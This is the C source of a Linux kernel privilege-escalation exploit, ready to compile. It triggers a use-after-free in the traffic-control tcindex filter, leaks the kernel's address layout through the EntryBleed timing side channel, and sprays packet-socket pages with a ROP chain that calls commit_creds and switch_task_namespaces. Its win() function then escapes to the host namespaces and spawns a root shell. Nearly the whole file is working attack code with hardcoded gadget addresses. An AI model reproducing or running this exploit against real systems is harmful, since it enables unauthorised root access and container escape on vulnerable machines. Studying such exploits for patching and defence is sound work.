// Compile: gcc exp.c -O0 -o exp -static && strip exp

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <net/if_arp.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <sys/uio.h>
#include <linux/fib_rules.h>
#include <linux/if_addrlabel.h>
#include <linux/if_bridge.h>
#include <linux/nexthop.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do                                     \
    {                                      \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

size_t kaslr, cs, sp, ss, rflags;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(cs), "=r"(ss), "=r"(rflags), "=r"(sp)
        :
        : "memory");
}

#include <sched.h>
static void set_cpu_affinity(int cpu_n, pid_t pid)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0)
    {
        die("sched_setaffinity: %m");
    }
}

static void hexDump(const void *data, size_t size)
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i)
    {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~')
        {
            ascii[i % 16] = ((unsigned char *)data)[i];
        }
        else
        {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size)
        {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0)
            {
                dprintf(2, "|  %s \n", ascii);
            }
            else if (i + 1 == size)
            {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8)
                {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

void win()
{
    if (fork())
    {
        for (;;)
            ;
    }
    logi("UwU 👻 Now root 👻 UwU");
    setns(open("/proc/1/ns/mnt", 0), 0);
    setns(open("/proc/1/ns/pid", 0), 0);
    setns(open("/proc/1/ns/net", 0), 0);
    execlp("/bin/bash", "/bin/bash", NULL);
    exit(0);
}

/**
 * ------------------------------------------------------------------------------------------------------
 *
 *       TC part, taken from iproute2(https://git.kernel.org/pub/scm/network/iproute2/iproute2.git)
 *
 * ------------------------------------------------------------------------------------------------------
 */
#define TCA_BUF_MAX (64 * 1024)
#define NLMSG_TAIL(nmsg) \
    ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
              int alen)
{
    int len = RTA_LENGTH(alen);
    struct rtattr *rta;

    if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen)
    {
        fprintf(stderr,
                "addattr_l ERROR: message exceeded bound of %d\n",
                maxlen);
        return -1;
    }
    rta = NLMSG_TAIL(n);
    rta->rta_type = type;
    rta->rta_len = len;
    if (alen)
        memcpy(RTA_DATA(rta), data, alen);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
    return 0;
}

int addattr(struct nlmsghdr *n, int maxlen, int type)
{
    return addattr_l(n, maxlen, type, NULL, 0);
}

int addattr8(struct nlmsghdr *n, int maxlen, int type, __u8 data)
{
    return addattr_l(n, maxlen, type, &data, sizeof(__u8));
}

int addattr16(struct nlmsghdr *n, int maxlen, int type, __u16 data)
{
    return addattr_l(n, maxlen, type, &data, sizeof(__u16));
}

int addattr32(struct nlmsghdr *n, int maxlen, int type, __u32 data)
{
    return addattr_l(n, maxlen, type, &data, sizeof(__u32));
}

int addattr64(struct nlmsghdr *n, int maxlen, int type, __u64 data)
{
    return addattr_l(n, maxlen, type, &data, sizeof(__u64));
}

int addattrstrz(struct nlmsghdr *n, int maxlen, int type, const char *str)
{
    return addattr_l(n, maxlen, type, str, strlen(str) + 1);
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type)
{
    struct rtattr *nest = NLMSG_TAIL(n);

    addattr_l(n, maxlen, type, NULL, 0);
    return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)
{
    nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
    return n->nlmsg_len;
}

void add_drr_qdisc(int sock, unsigned int ifindex, unsigned int handle)
{
    struct
    {
        struct nlmsghdr n;
        struct tcmsg t;
        char buf[TCA_BUF_MAX];
    } req = {
        .n.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg)),
        .n.nlmsg_flags = NLM_F_REQUEST | (NLM_F_EXCL | NLM_F_CREATE),
        .n.nlmsg_type = RTM_NEWQDISC,
        .t.tcm_family = AF_UNSPEC,
    };

    req.t.tcm_parent = 0xFFFFFFFF; // TC_H_ROOT
    req.t.tcm_ifindex = ifindex;
    req.t.tcm_handle = handle;

    addattr_l(&req.n, sizeof(req), TCA_KIND, "drr", strlen("drr"));

    struct sockaddr_nl nladdr = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0,
        .nl_groups = 0,
        .nl_pad = 0,
    };
    struct iovec iov = {.iov_base = (void *)&req.n, .iov_len = req.n.nlmsg_len};
    struct msghdr msg = {
        .msg_name = (void *)&(nladdr),
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(sock, &msg, 0);
}

void del_drr_qdisc(int sock, unsigned int ifindex, unsigned int handle)
{
    struct
    {
        struct nlmsghdr n;
        struct tcmsg t;
        char buf[TCA_BUF_MAX];
    } req = {
        .n.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg)),
        .n.nlmsg_flags = NLM_F_REQUEST,
        .n.nlmsg_type = RTM_NEWQDISC,
        .t.tcm_family = AF_UNSPEC,
    };

    req.t.tcm_parent = 0xFFFFFFFF; // TC_H_ROOT
    req.t.tcm_ifindex = ifindex;
    req.t.tcm_handle = handle;

    addattr_l(&req.n, sizeof(req), TCA_KIND, "drr", strlen("drr"));

    struct sockaddr_nl nladdr = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0,
        .nl_groups = 0,
        .nl_pad = 0,
    };
    struct iovec iov = {.iov_base = (void *)&req.n, .iov_len = req.n.nlmsg_len};
    struct msghdr msg = {
        .msg_name = (void *)&(nladdr),
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(sock, &msg, 0);
}

void add_drr_class(int sock, unsigned int ifindex, unsigned int parent_handle, unsigned int handle)
{
    struct
    {
        struct nlmsghdr n;
        struct tcmsg t;
        char buf[4096];
    } req = {
        .n.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg)),
        .n.nlmsg_flags = NLM_F_REQUEST | (NLM_F_EXCL | NLM_F_CREATE),
        .n.nlmsg_type = RTM_NEWTCLASS,
        .t.tcm_family = AF_UNSPEC,
    };

    req.t.tcm_ifindex = ifindex;
    req.t.tcm_parent = parent_handle;
    req.t.tcm_handle = handle;

    addattr_l(&req.n, sizeof(req), TCA_KIND, "drr", strlen("drr"));
    struct rtattr *tail = addattr_nest(&req.n, 1024, TCA_OPTIONS);
    addattr_nest_end(&req.n, tail);

    struct sockaddr_nl nladdr = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0,
        .nl_groups = 0,
        .nl_pad = 0,
    };
    struct iovec iov = {.iov_base = (void *)&req.n, .iov_len = req.n.nlmsg_len};
    struct msghdr msg = {
        .msg_name = (void *)&(nladdr),
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(sock, &msg, 0);
}

void del_drr_class(int sock, unsigned int ifindex, unsigned int parent_handle, unsigned int handle)
{
    struct
    {
        struct nlmsghdr n;
        struct tcmsg t;
        char buf[4096];
    } req = {
        .n.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg)),
        .n.nlmsg_flags = NLM_F_REQUEST,
        .n.nlmsg_type = RTM_DELTCLASS,
        .t.tcm_family = AF_UNSPEC,
    };

    req.t.tcm_ifindex = ifindex;
    req.t.tcm_parent = parent_handle;
    req.t.tcm_handle = handle;

    addattr_l(&req.n, sizeof(req), TCA_KIND, "drr", strlen("drr"));

    struct sockaddr_nl nladdr = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0,
        .nl_groups = 0,
        .nl_pad = 0,
    };
    struct iovec iov = {.iov_base = (void *)&req.n, .iov_len = req.n.nlmsg_len};
    struct msghdr msg = {
        .msg_name = (void *)&(nladdr),
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(sock, &msg, 0);
}

enum
{
    TCA_TCINDEX_UNSPEC,
    TCA_TCINDEX_HASH,
    TCA_TCINDEX_MASK,
    TCA_TCINDEX_SHIFT,
    TCA_TCINDEX_FALL_THROUGH,
    TCA_TCINDEX_CLASSID,
    TCA_TCINDEX_POLICE,
    TCA_TCINDEX_ACT,
    __TCA_TCINDEX_MAX
};

void add_tcindex_filter(int sock, unsigned int ifindex, unsigned int parent_handle, unsigned int handle, unsigned int hash, unsigned int classid)
{
    struct
    {
        struct nlmsghdr n;
        struct tcmsg t;
        char buf[4096];
    } req = {
        .n.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg)),
        .n.nlmsg_flags = NLM_F_REQUEST | (NLM_F_CREATE),
        .n.nlmsg_type = RTM_NEWTFILTER,
        .t.tcm_family = AF_UNSPEC,
        req.t.tcm_info = (((1 << 16) & 0xFFFF0000U) | ((htons(ETH_P_ALL)) & 0x0000FFFFU)) // TC_H_MAKE(prio<<16, protocol),
    };

    req.t.tcm_ifindex = ifindex;
    req.t.tcm_parent = parent_handle;
    req.t.tcm_handle = handle;

    addattr_l(&req.n, sizeof(req), TCA_KIND, "tcindex", strlen("tcindex"));

    struct tcmsg *t = NLMSG_DATA(&req.n);
    struct rtattr *tail = addattr_nest(&req.n, 4096, TCA_OPTIONS);

    unsigned int shift = 16;
    unsigned short mask = 0xffff;
    hash = hash;
    classid = classid;
    addattr_l(&req.n, 4096, TCA_TCINDEX_HASH, &hash,
              sizeof(hash));
    addattr_l(&req.n, 4096, TCA_TCINDEX_MASK, &mask,
              sizeof(mask));
    addattr_l(&req.n, 4096, TCA_TCINDEX_SHIFT, &shift,
              sizeof(shift));
    addattr_l(&req.n, 4096, TCA_TCINDEX_CLASSID, &classid, 4);
    addattr_nest_end(&req.n, tail);

    struct sockaddr_nl nladdr = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0,
        .nl_groups = 0,
        .nl_pad = 0,
    };
    struct iovec iov = {.iov_base = (void *)&req.n, .iov_len = req.n.nlmsg_len};
    struct msghdr msg = {
        .msg_name = (void *)&(nladdr),
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(sock, &msg, 0);
}

void del_tcindex_filter(int sock, unsigned int ifindex, unsigned int parent_handle, unsigned int handle)
{
    struct
    {
        struct nlmsghdr n;
        struct tcmsg t;
        char buf[4096];
    } req = {
        .n.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg)),
        .n.nlmsg_flags = NLM_F_REQUEST,
        .n.nlmsg_type = RTM_DELTFILTER,
        .t.tcm_family = AF_UNSPEC,
        req.t.tcm_info = (((1 << 16) & 0xFFFF0000U) | ((htons(ETH_P_ALL)) & 0x0000FFFFU)) // TC_H_MAKE(prio<<16, protocol),
    };

    req.t.tcm_ifindex = ifindex;
    req.t.tcm_parent = parent_handle;
    req.t.tcm_handle = handle;

    addattr_l(&req.n, sizeof(req), TCA_KIND, "tcindex", strlen("tcindex"));

    struct sockaddr_nl nladdr = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0,
        .nl_groups = 0,
        .nl_pad = 0,
    };
    struct iovec iov = {.iov_base = (void *)&req.n, .iov_len = req.n.nlmsg_len};
    struct msghdr msg = {
        .msg_name = (void *)&(nladdr),
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(sock, &msg, 0);
}

/**
 * ------------------------------------------------------------------------------------------------------
 *
 *          USMA part, taken from veritas(@veritas501) https://github.com/veritas501/CVE-2022-34918
 *
 * ------------------------------------------------------------------------------------------------------
 */

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/mman.h>
#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif
#define SPRAY_PG_VEC_NUM 0x100
#define PAGE_NUM (128 / 8)

int pgfd[SPRAY_PG_VEC_NUM] = {};
void *pgaddr[SPRAY_PG_VEC_NUM] = {};

void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout)
{
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0)
    {
        die("setsockopt(PACKET_VERSION): %m");
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0)
    {
        die("setsockopt(PACKET_RX_RING): %m");
    }
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout)
{
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0)
    {
        die("socket(AF_PACKET): %m");
    }

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0)
    {
        die("bind(AF_PACKET): %m");
    }

    return s;
}

int pagealloc_pad(int count, int size)
{
    return packet_socket_setup(size, 2048, count, 0, 10000);
}

/**
 * ------------------------------------------------------------------------------------------------------
 *
 *          EntryBleed part, taken from CVE-2022-4543(https://www.willsroot.io/2022/12/entrybleed.html)
 *
 * ------------------------------------------------------------------------------------------------------
 */

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
#define entry_SYSCALL_64_offset (0x1200000ull)

uint64_t sidechannel(uint64_t addr)
{
    uint64_t a, b, c, d;
    asm volatile(".intel_syntax noprefix;"
                 "mfence;"
                 "rdtscp;"
                 "mov %0, rax;"
                 "mov %1, rdx;"
                 "xor rax, rax;"
                 "lfence;"
                 "prefetchnta qword ptr [%4];"
                 "prefetcht2 qword ptr [%4];"
                 "xor rax, rax;"
                 "lfence;"
                 "rdtscp;"
                 "mov %2, rax;"
                 "mov %3, rdx;"
                 "mfence;"
                 ".att_syntax;"
                 : "=r"(a), "=r"(b), "=r"(c), "=r"(d)
                 : "r"(addr)
                 : "rax", "rbx", "rcx", "rdx");
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

#define STEP 0x100000ull
#define SCAN_START KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset
#define SCAN_END KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset

#define DUMMY_ITERATIONS 10
#define ITERATIONS 0x100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP

uint64_t leak_syscall_entry(void)
{
    uint64_t data[ARR_SIZE] = {0};
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++)
        {
            uint64_t test = SCAN_START + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
    }

    return addr;
}

#include <sys/ioctl.h>
#include <net/if.h>
void trigger()
{
    // no need to create a real server =.=
    char buf[1024];
    int s;
    struct sockaddr_in server = {0};
    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0)
    {
        die("socket: %m");
    }
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(31337);
    
    // bring lo up ovo
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    ifr.ifr_flags |= IFF_UP;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0)
    {
        die("ioctl-SIOCSIFFLAGS");
    }

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        die("connect: %m");
    }
    if (send(s, buf, 1023, 0) < 0)
    {
        die("send: %m");
    }
    close(s);
}

int main(int argc, char **argv, char **envp)
{
    uint64_t sock = -1;
    unsigned int lo_link_id = 1;

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET))
        die("unshare");

#define REMOTE
#ifdef REMOTE
    if (true)
    {
        size_t kaslrs[4];
        for (int i = 0; i < 4; i++)
        {
            kaslrs[i] = leak_syscall_entry() - entry_SYSCALL_64_offset - 0xffffffff81000000ull;
        }

        for (int j = 1; j < 4; j++)
        {
            if (kaslrs[j] != kaslrs[0])
            {
                die("leak kaslr");
            }
        }
        logi("leaked kaslr = 0x%lx", kaslrs[3]);
        kaslr = kaslrs[3] - 0x400000;
        logi("set kaslr = 0x%lx", kaslr);
    }
#endif

    set_cpu_affinity(0, getpid());
    save_state();

    if ((sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)) < 0)
    {
        die("socket: %m");
    }

    logd("Setup drr qdisc and class.");

    add_drr_qdisc(sock, lo_link_id, 0x10000);
    add_drr_class(sock, lo_link_id, 0x10000, 0x00001);

    logd("Try create UAF..");

    for (int _ = 0; _ < 0xff; _++)
    {
        unsigned int N = 0x100;
        for (int h = 0; h < N; h++)
            add_tcindex_filter(sock, lo_link_id, 0x10000, h, N, 0x10001);
        add_tcindex_filter(sock, lo_link_id, 0x10000, 0, 1, 0x10001);
    }

    unsigned int N = 0x1000 - 2 + 1;
    for (int h = 0; h < N; h++)
        add_tcindex_filter(sock, lo_link_id, 0x10000, h, N, 0x10001);
    for (int h = 0; h < 0xe00; h++)
        del_tcindex_filter(sock, lo_link_id, 0x10000, N - 1 - h);

    logd("Let's see...");

    del_drr_class(sock, lo_link_id, 0x10000, 0x00001);

    for (int i = 0; i < SPRAY_PG_VEC_NUM; i++)
    {
        pgfd[i] = pagealloc_pad(PAGE_NUM, 0x1000);
    }

    for (int i = 0; i < SPRAY_PG_VEC_NUM; i++)
    {
        if (!pgfd[i])
            continue;
        pgaddr[i] = mmap(NULL, PAGE_NUM * 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, pgfd[i], 0);
        for (int j = 0; j < PAGE_NUM; j++)
        {
            memset(pgaddr[i], 0, 0x1000);
            unsigned long *rop = pgaddr[i] + j * 0x1000;

            size_t pop_rdi_ret = 0xffffffff81c90302 + kaslr;
            size_t pop_rsi_ret = 0xffffffff81a9e0be + kaslr;
            size_t push_rsi_jump_rsi_39 = 0xffffffff8197b467 + kaslr; //  push rsi ; jmp qword [rsi+0x39] ;
            size_t pop_rsp_r15_ret = 0xffffffff8112af1e + kaslr;
            size_t push_rsi_jump_rsi_66 = 0xffffffff81c77562 + kaslr;  //  push rsi ; jmp qword [rsi+0x66] ;
            size_t pop_alot_ret = 0xffffffff81af1aeb + kaslr;          //  add rsp,0xa0 ; mov eax,r14d ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ;
            size_t push_rax_push_rdi_ret = 0xffffffff814d4fac + kaslr; //  push rax ; push rdi ; add byte [rax-0x75], cl ; sbb esi, esi ; ret ;

            size_t init_cred = 0xffffffff836748e0 + kaslr;
            size_t commit_creds = 0xffffffff811bb490 + kaslr;
            size_t find_task_by_vpid = 0xffffffff811b1e60 + kaslr;
            size_t init_nsproxy = 0xffffffff836746a0 + kaslr;
            size_t switch_task_namespaces = 0xffffffff811b98f0 + kaslr;
            size_t vfork = 0xffffffff8118C3D0 + kaslr;
            size_t msleep = 0xffffffff812247e0 + kaslr;

            *(unsigned long *)((size_t)pgaddr[i] + j * 0x1000 + 0x39) = pop_rsp_r15_ret;
            *(unsigned long *)((size_t)pgaddr[i] + j * 0x1000 + 0x66) = pop_alot_ret;

            unsigned int idx = 0;
            rop[idx++] = push_rsi_jump_rsi_39;
            rop[idx++] = push_rsi_jump_rsi_66;

            idx = (0xd8 / 8); // can easily obtained while debugging

            // commit_creds(&init_cred);
            rop[idx++] = pop_rdi_ret;
            rop[idx++] = init_cred;
            rop[idx++] = commit_creds;
            // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy);
            rop[idx++] = pop_rdi_ret;
            rop[idx++] = 1;
            rop[idx++] = find_task_by_vpid;
            rop[idx++] = pop_rsi_ret;
            rop[idx++] = pop_rdi_ret;
            rop[idx++] = push_rax_push_rdi_ret;
            rop[idx++] = pop_rsi_ret;
            rop[idx++] = init_nsproxy;
            rop[idx++] = switch_task_namespaces;
            //  vfork() -> msleep(0xdeadbeef);
            rop[idx++] = vfork;
            rop[idx++] = pop_rdi_ret;
            rop[idx++] = 0xdeadbeef;
            rop[idx++] = msleep;
        }

        if (pgaddr[i] <= 0)
        {
            die("mmap: %m");
        }
    }

    trigger();
    win();

    return 0;
}